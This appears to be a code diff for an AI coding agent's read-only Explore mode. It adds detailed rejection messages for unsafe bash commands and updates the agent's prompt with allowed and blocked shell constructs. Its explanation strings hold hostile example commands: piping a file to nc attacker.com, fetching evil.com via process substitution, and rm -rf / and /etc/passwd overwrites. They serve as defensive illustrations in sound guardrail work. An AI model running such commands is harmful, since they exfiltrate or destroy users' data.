@@ -479,6 +479,246 @@ export function hasDangerousSubstitution(command: string): boolean {
   return false;
 }
 
+// ============================================================
+// Bash Rejection Reasons (Detailed error messages)
+// ============================================================
+
+/**
+ * Detailed reason why a bash command was rejected in Explore mode.
+ * Used to provide helpful error messages that explain exactly what was blocked and why.
+ */
+export type BashRejectionReason =
+  | { type: 'control_char'; char: string; charCode: number; explanation: string }
+  | { type: 'no_safe_pattern' }
+  | { type: 'dangerous_operator'; operator: string; operatorType: 'chain' | 'redirect'; explanation: string }
+  | { type: 'dangerous_substitution'; pattern: string; explanation: string }
+  | { type: 'parse_error'; error: string };
+
+/**
+ * Human-readable explanations for dangerous operators.
+ * These help the agent understand why specific operators are blocked.
+ */
+const OPERATOR_EXPLANATIONS: Record<string, string> = {
+  // Chain operators
+  '&&': 'runs second command if first succeeds (e.g., `safe && dangerous`)',
+  '||': 'runs second command if first fails (e.g., `safe || dangerous`)',
+  ';': 'always runs second command regardless of first (e.g., `safe; dangerous`)',
+  '|': 'pipes output to another command which could be dangerous (e.g., `cat file | nc attacker.com`)',
+  '&': 'runs command in background, allowing additional commands',
+  '|&': 'pipes both stdout and stderr to another command',
+  // Redirect operators
+  '>': 'overwrites file contents (e.g., `echo data > /etc/passwd`)',
+  '>>': 'appends to file (e.g., `echo data >> ~/.bashrc`)',
+  '>&': 'redirects stderr to a file',
+};
+
+/**
+ * Human-readable explanations for control characters.
+ */
+const CONTROL_CHAR_EXPLANATIONS: Record<string, string> = {
+  '\n': 'newline acts as command separator in bash (e.g., `safe\\ndangerous` runs both)',
+  '\r': 'carriage return can act as command separator',
+  '\x00': 'null byte can truncate strings and cause unexpected behavior',
+};
+
+/**
+ * Find the first dangerous control character in a command.
+ * Returns details about the character if found, null otherwise.
+ */
+function findDangerousControlChar(command: string): { char: string; charCode: number; explanation: string } | null {
+  for (const char of command) {
+    if (DANGEROUS_CONTROL_CHARS.has(char)) {
+      const charCode = char.charCodeAt(0);
+      const displayChar = char === '\n' ? '\\n' : char === '\r' ? '\\r' : char === '\x00' ? '\\0' : `\\x${charCode.toString(16).padStart(2, '0')}`;
+      const explanation = CONTROL_CHAR_EXPLANATIONS[char] ?? `control character (code ${charCode}) can cause unexpected behavior`;
+      return { char: displayChar, charCode, explanation };
+    }
+  }
+  return null;
+}
+
+/**
+ * Find the first dangerous shell operator in a command.
+ * Returns details about the operator if found, null otherwise.
+ */
+function findDangerousOperator(command: string): { operator: string; operatorType: 'chain' | 'redirect'; explanation: string } | null {
+  try {
+    const parsed = parseShellCommand(command);
+
+    for (const token of parsed) {
+      const op = getOperator(token);
+      if (op) {
+        if (DANGEROUS_CHAIN_OPERATORS.has(op)) {
+          return {
+            operator: op,
+            operatorType: 'chain',
+            explanation: OPERATOR_EXPLANATIONS[op] ?? 'allows command chaining',
+          };
+        }
+        if (DANGEROUS_REDIRECT_OPERATORS.has(op)) {
+          return {
+            operator: op,
+            operatorType: 'redirect',
+            explanation: OPERATOR_EXPLANATIONS[op] ?? 'allows file redirection',
+          };
+        }
+      }
+    }
+    return null;
+  } catch {
+    // Parse error handled separately
+    return null;
+  }
+}
+
+/**
+ * Find dangerous command/process substitution in a command.
+ * Returns details about the pattern if found, null otherwise.
+ */
+function findDangerousSubstitution(command: string): { pattern: string; explanation: string } | null {
+  let inSingleQuote = false;
+  let escaped = false;
+
+  for (let i = 0; i < command.length; i++) {
+    const char = command[i];
+    const nextChar = command[i + 1];
+
+    if (escaped) {
+      escaped = false;
+      continue;
+    }
+
+    if (char === '\\' && !inSingleQuote) {
+      escaped = true;
+      continue;
+    }
+
+    if (char === "'" && !escaped) {
+      inSingleQuote = !inSingleQuote;
+      continue;
+    }
+
+    if (!inSingleQuote) {
+      if (char === '$' && nextChar === '(') {
+        return {
+          pattern: '$()',
+          explanation: 'command substitution executes embedded commands during expansion (e.g., `ls $(rm -rf /)`)',
+        };
+      }
+
+      if (char === '`') {
+        return {
+          pattern: '`...`',
+          explanation: 'backtick substitution executes embedded commands (e.g., `echo \\`rm -rf /\\``)',
+        };
+      }
+
+      if (char === '<' && nextChar === '(') {
+        return {
+          pattern: '<()',
+          explanation: 'process substitution executes commands and provides output as a file (e.g., `cat <(curl evil.com)`)',
+        };
+      }
+
+      if (char === '>' && nextChar === '(') {
+        return {
+          pattern: '>()',
+          explanation: 'process substitution executes commands with input from a file descriptor',
+        };
+      }
+    }
+  }
+
+  return null;
+}
+
+/**
+ * Get detailed reason why a bash command would be rejected.
+ * Returns null if the command is safe, otherwise returns the specific reason.
+ *
+ * This is used to provide helpful error messages that explain exactly what
+ * was blocked and why, helping the agent understand and avoid the issue.
+ */
+export function getBashRejectionReason(command: string, config: ToolCheckConfig): BashRejectionReason | null {
+  const trimmedCommand = command.trim();
+
+  // Step 1: Check for dangerous control characters
+  const controlChar = findDangerousControlChar(trimmedCommand);
+  if (controlChar) {
+    return {
+      type: 'control_char',
+      char: controlChar.char,
+      charCode: controlChar.charCode,
+      explanation: controlChar.explanation,
+    };
+  }
+
+  // Step 2: Check if command matches a safe prefix pattern
+  const matchesSafePattern = config.readOnlyBashPatterns.some(pattern => pattern.test(trimmedCommand));
+  if (!matchesSafePattern) {
+    return { type: 'no_safe_pattern' };
+  }
+
+  // Step 3: Check for dangerous operators (command passed safe pattern check)
+  // First check for parse errors
+  try {
+    parseShellCommand(trimmedCommand);
+  } catch (error) {
+    return {
+      type: 'parse_error',
+      error: error instanceof Error ? error.message : 'Unknown parse error',
+    };
+  }
+
+  const operator = findDangerousOperator(trimmedCommand);
+  if (operator) {
+    return {
+      type: 'dangerous_operator',
+      operator: operator.operator,
+      operatorType: operator.operatorType,
+      explanation: operator.explanation,
+    };
+  }
+
+  // Step 4: Check for dangerous substitution
+  const substitution = findDangerousSubstitution(trimmedCommand);
+  if (substitution) {
+    return {
+      type: 'dangerous_substitution',
+      pattern: substitution.pattern,
+      explanation: substitution.explanation,
+    };
+  }
+
+  // Command is safe
+  return null;
+}
+
+/**
+ * Format a bash rejection reason into a user-friendly error message.
+ * The message explains what was blocked and why, helping the agent understand the issue.
+ */
+export function formatBashRejectionMessage(reason: BashRejectionReason, config: ToolCheckConfig): string {
+  const modeSwitchHint = `Switch to Ask or Allow All mode (${config.shortcutHint}) to run it.`;
+
+  switch (reason.type) {
+    case 'control_char':
+      return `Bash command blocked: contains "${reason.char}" character. ${reason.explanation}. ${modeSwitchHint}`;
+
+    case 'no_safe_pattern':
+      return `This Bash command is not in the read-only allowlist for ${config.displayName}. ${modeSwitchHint}`;
+
+    case 'dangerous_operator':
+      return `Bash command blocked: contains "${reason.operator}" operator. This ${reason.explanation}. Run commands separately or switch to Ask mode.`;
+
+    case 'dangerous_substitution':
+      return `Bash command blocked: contains ${reason.pattern} syntax. ${reason.explanation}. ${modeSwitchHint}`;
+
+    case 'parse_error':
+      return `Bash command blocked: could not parse command safely (${reason.error}). ${modeSwitchHint}`;
+  }
+}
+
 /**
  * Check if a Bash command is read-only using the given config.
  *
@@ -679,15 +919,26 @@ export function shouldAllowToolInMode(
   }
 
   // Handle Bash - check if command is read-only
+  // Uses detailed rejection reasons to provide helpful error messages
   if (toolName === 'Bash') {
     const input = toolInput as Record<string, unknown> | null;
     const command = input?.command;
-    if (typeof command === 'string' && isReadOnlyBashCommandWithConfig(command, config)) {
-      return { allowed: true };
+    if (typeof command === 'string') {
+      const rejection = getBashRejectionReason(command, config);
+      if (!rejection) {
+        // Command is safe - no rejection reason means it passed all checks
+        return { allowed: true };
+      }
+      // Return detailed error message explaining exactly why the command was blocked
+      return {
+        allowed: false,
+        reason: formatBashRejectionMessage(rejection, config),
+      };
     }
+    // No command provided - block with generic message
     return {
       allowed: false,
-      reason: `This Bash command is not in the read-only allowlist for ${config.displayName}. Switch to Ask or Allow All mode (${config.shortcutHint}) to run it.`
+      reason: `Bash command is missing or invalid. Switch to Ask or Allow All mode (${config.shortcutHint}) to run it.`,
     };
   }
 
@@ -901,15 +1152,34 @@ Read-only exploration mode. You can read, search, and explore but cannot make ch
 
 | Operation | Allowed? | Notes |
 |-----------|----------|-------|
-| Read Craft documents | ✅ | blocks_get, document_search, etc. |
+| Read MCP sources | ✅ | search, list, get operations |
 | File exploration | ✅ | Read, Glob, Grep |
 | Web search/fetch | ✅ | WebSearch, WebFetch |
 | API GET requests | ✅ | Read-only API calls |
 | **Plans folder** | ✅ | Write/Edit allowed to session plans folder |
-| **Read-only Bash** | ✅ | ls, cat, git status, grep, etc. |
+| **Read-only Bash** | ✅ | See list below |
 | File writes/edits | ❌ | ${blockedTools} blocked (except plans folder) |
-| Craft modifications | ❌ | blocks_add, blocks_update blocked |
+| MCP mutations | ❌ | create, update, delete operations blocked |
 | API mutations | ❌ | POST, PUT, DELETE blocked |
+
+**Read-only Bash commands allowed in Explore mode:**
+- **File exploration**: ls, tree, cat, head, tail, file, stat, wc, du, df
+- **Search**: find, grep, rg, ag, fd, locate, which
+- **Git**: git status, git log, git diff, git show, git branch, git blame, git history, git reflog
+- **GitHub CLI**: gh pr view/list, gh issue view/list, gh repo view
+- **Package managers**: npm ls/list/outdated, yarn list, pip list, cargo tree
+- **System info**: pwd, whoami, env, ps, uname, hostname, date
+- **Text processing**: jq, yq, sort, uniq, cut, column
+- **Network diagnostics**: ping, dig, nslookup, netstat
+- **Version checks**: node --version, python --version, etc.
+
+**Blocked shell constructs:** Even allowed commands are blocked if they contain dangerous shell constructs:
+- **Command chaining**: \`&&\`, \`||\`, \`;\`, \`|\`, \`&\` - could chain to dangerous commands
+- **Redirects**: \`>\`, \`>>\` - could overwrite files
+- **Substitution**: \`$()\`, backticks, \`<()\`, \`>()\` - execute embedded commands
+- **Control chars**: newlines, carriage returns - act as command separators
+
+Example: \`git status && rm -rf /\` is blocked because \`&&\` allows command chaining. Run commands separately instead.
 
 **When ready to implement:** Don't ask the user to switch modes. Instead, write a plan and use \`SubmitPlan\` - the "Accept Plan" button switches to ${PERMISSION_MODE_CONFIG['allow-all'].displayName} mode automatically.
 
@@ -920,7 +1190,7 @@ Default interactive mode. Prompts before edits, but read-only operations run fre
 | Operation | Allowed? | Notes |
 |-----------|----------|-------|
 | All file operations | ✅ | Write, Edit, Read, etc. |
-| All Craft operations | ✅ | blocks_add, blocks_update, etc. |
+| All MCP operations | ✅ | search, list, create, update, etc. |
 | All API operations | ✅ | GET, POST, PUT, DELETE |
 | Read-only Bash | ✅ | ls, git status, grep, etc. (same as ${PERMISSION_MODE_CONFIG['safe'].displayName}) |
 | Other Bash commands | ⚠️ | Prompts for approval (can click "Always allow") |
@@ -977,5 +1247,16 @@ When in ${PERMISSION_MODE_CONFIG['safe'].displayName} mode and ready to implemen
 3. The user can click "Accept Plan" to exit ${PERMISSION_MODE_CONFIG['safe'].displayName} mode and begin implementation
 4. Once accepted, proceed with the implementation steps
 
-This is the recommended way to transition from exploration to implementation.`;
+This is the recommended way to transition from exploration to implementation.
+
+### Customizing Explore Mode Permissions
+
+You can customize Explore mode via \`permissions.json\` files - extend what's allowed (bash patterns, MCP tools, API endpoints) or block specific tools entirely.
+
+| Level | Path | Scope |
+|-------|------|-------|
+| Workspace | \`{workspaceRoot}/permissions.json\` | All sources in workspace |
+| Per-source | \`{workspaceRoot}/sources/{slug}/permissions.json\` | That source only (auto-scoped) |
+
+**Before editing**: Read \`~/.craft-agent/docs/permissions.md\` for the full schema and examples.`;
 }
